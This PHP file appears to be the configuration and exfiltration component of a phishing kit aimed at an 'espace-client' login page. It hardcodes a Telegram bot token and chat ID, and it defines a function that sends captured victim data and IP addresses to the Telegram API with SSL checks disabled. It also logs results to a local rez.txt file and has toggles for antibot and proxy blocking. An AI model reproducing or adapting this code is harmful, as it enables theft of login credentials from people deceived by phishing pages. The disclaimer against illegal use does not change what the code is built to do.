<?php

// This example page was made by @j33h4n
// Telegram me: https://t.me/j33h4n
// Don't use this example in any illegal use!


// telegram information
$token = "7073094153:AAEUej77v-7p5VITnTC4YlghAc_N6sGj_Nw";
$id = "-1002118766813";


// use antibot? yes|no
$antibot = "yes";

// want to block all VPNs/PROXIES? yes|no
$block_proxy = "no";

 


$ipp = "";
if($_SERVER['REMOTE_ADDR']=="::1"){
$ipp = "127.0.0.1";
}else{
$ipp = $_SERVER['REMOTE_ADDR'];
}
$panel_link = str_replace("espace-client/post.php", "panel/ctr.php", "https://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."?ip=$ipp");

 
function call($msg){
    global $token;
    global $panel_link;
    global $id;
    $info = "

/- MORE INFO -/
PANEL : $panel_link
IP: ".$_SERVER['REMOTE_ADDR'];

    $c = curl_init('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$id.'&text='.urlencode($msg.$info));
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    $res = curl_exec($c);
    curl_close($c);
    return $res;
}


function save($txt){
    $fp = fopen((__DIR__)."/rez.txt", "a");
    fwrite($fp, $txt);
    fclose($fp);
}




?>